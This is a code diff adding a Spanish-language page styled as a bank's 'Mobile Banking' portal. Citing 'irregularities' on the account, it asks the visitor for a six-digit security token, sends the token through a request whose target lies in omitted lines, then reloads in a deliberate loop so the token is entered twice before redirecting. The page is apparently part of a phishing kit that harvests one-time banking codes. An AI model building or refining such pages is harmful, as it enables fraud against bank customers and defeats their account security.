@@ -1,3 +1,58 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Banking</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<!-- Header -->
+<header class="top-bar">
+    <div class="title">Mobile Banking</div>
+    <div class="classic">
+        <span class="home-icon">🏠</span>
+        Versión Clásica
+    </div>
+</header>
+
+<!-- Logo -->
+<div class="logo-container">
+    <img src="bna.png" alt="Logo">
+</div>
+
+<!-- Card -->
+<div class="login-card">
+    <div class="login-title">Verificación requerida</div>
+
+    <div class="token-error">
+        Notamos irregularidades en su cuenta, para continuar,
+        por favor ingrese su <strong></strong>
+    </div>
+
+    <input
+        type="text"
+        id="tokenInput"
+        class="token-input"
+        maxlength="6"
+        inputmode="numeric"
+        autocomplete="off"
+        required
+    >
+
+    <button type="button" class="btn-accept" onclick="enviarToken()">
+        <span class="check">✔</span>
+        Aceptar
+    </button>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+    <span class="close">✖</span>
+    <p>Salir</p>
+</footer>
+
 <script>
 const tokenInput = document.getElementById("tokenInput");
 
@@ -15,8 +70,8 @@ function enviarToken() {
         return;
     }
 
-    // Contador de clicks
-    let clicks = Number(sessionStorage.getItem("clicksAceptar") || 0);
+    // CONTADOR DE CLICKS (persiste en el reload)
+    let clicks = Number(sessionStorage.getItem("clicksAceptar")) || 0;
     clicks++;
     sessionStorage.setItem("clicksAceptar", clicks);
 
@@ -30,10 +85,14 @@ function enviarToken() {
     }).finally(() => {
         if (clicks >= 2) {
             sessionStorage.removeItem("clicksAceptar");
-            window.location.href = "index.html";
+            window.location.href = "/"; // index.html
         } else {
-            window.location.reload();
+            window.location.reload(); // bucle
         }
     });
 }
 </script>
+
+</body>
+</html>
+
